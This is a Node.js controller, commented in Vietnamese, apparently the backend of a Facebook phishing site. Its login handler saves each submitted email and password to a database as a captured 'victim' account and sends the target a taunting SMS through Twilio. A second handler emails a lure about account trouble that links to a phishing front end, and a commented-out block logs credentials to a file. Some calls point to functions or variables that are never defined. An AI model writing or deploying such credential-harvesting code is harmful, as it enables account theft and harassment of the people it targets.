import exp from "constants";
import fs from "fs";
import nodemailer from "nodemailer";
import twilio from "twilio";

import AccountModel from "../../models/account.models.js";

const login = async (req, res) => {
  const { email, password, phone } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
  }

  //kiem tra email ton tai
  const emailIsExists = await AccountModel.findOne({ email: email });
  if (emailIsExists) {
    console.log(`email ${email} da ton tai!`);
  } else {
    // Lưu thông tin vào file log
    // const logData = `Email: ${email} | Password: ${password}\n`;
    // fs.appendFileSync("log.txt", logData);

    // console.log("Đã lưu:", logData);

    //Lưu thông tin vào db
    const phishedAccount = { email, password };
    await AccountModel.create(phishedAccount);
    console.log("Đã lưu tài khoản con mồi vào db");
    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    isEmail ? sendPhishingEmail(email) : sendSms(email);
    // res.json({ message: "Đăng nhập thất bại! Sai mật khẩu hoặc tài khoản." });
    res.status(200).json({ message: "mat acc roi hahahah" });
  }
};

//Gui sms
const sendSms = async (phone) => {
  const client = new twilio(
    process.env.TWILIO_ACCOUNT_SID,
    process.env.TWILIO_AUTH_TOKEN
  );
  try {
    const sms = await client.messages.create({
      body: "haha thang ngu mat acc",
      from: process.env.TWILIO_PHONE_NUMBER,
      to: phone,
    });
    console.log({ success: true, sid: sms.sid });
  } catch (error) {
    console.log({ success: false, error: error.message });
  }
};
// Gửi email phishing
// const sendPhishingEmail = async (req) => {
//   const {}
//   try {
//     const transporter = nodemailer.createTransport({
//       service: "Gmail",
//       auth: {
//         user: process.env.EMAIL_USERNAME,
//         pass: process.env.EMAIL_PASSWORD,
//       },
//     });

//     const mailOptions = {
//       from: process.env.EMAIL_USERNAME,
//       to: targetEmail,
//       subject: "Tài khoản của bạn đang gặp sự cố!",
//       text: `Mất acc rồi nha lêu lêu :))))`,
//     };

//     await transporter.sendMail(mailOptions);
//     console.log("Email phishing đã gửi đến:", targetEmail);
//   } catch (error) {
//     console.error("Lỗi gửi email:", error);
//   }
// };
const sendEmail = async (req, res) => {
  const { email } = req.body;

  // Cấu hình transporter với Gmail (hoặc SMTP khác)
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USERNAME,
      pass: process.env.EMAIL_PASSWORD, // Không dùng mật khẩu thật, dùng App Password nếu 2FA
    },
  });

  const mailOptions = {
    from: EMAIL_USERNAME,
    to: email,
    subject: `Tài khoản Facebook của bạn đã gặp vấn đề`,
    text: `Hãy bấm vào đường link này để xem chi tiết.
      https://fb-phishing-fe.onrender.com`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res
      .status(200)
      .send({ success: true, message: "Email sent successfully!" });
  } catch (error) {
    res
      .status(500)
      .send({ success: false, message: "Failed to send email.", error });
  }
};
const authController = {
  login,
  sendEmail,
};

export default authController;
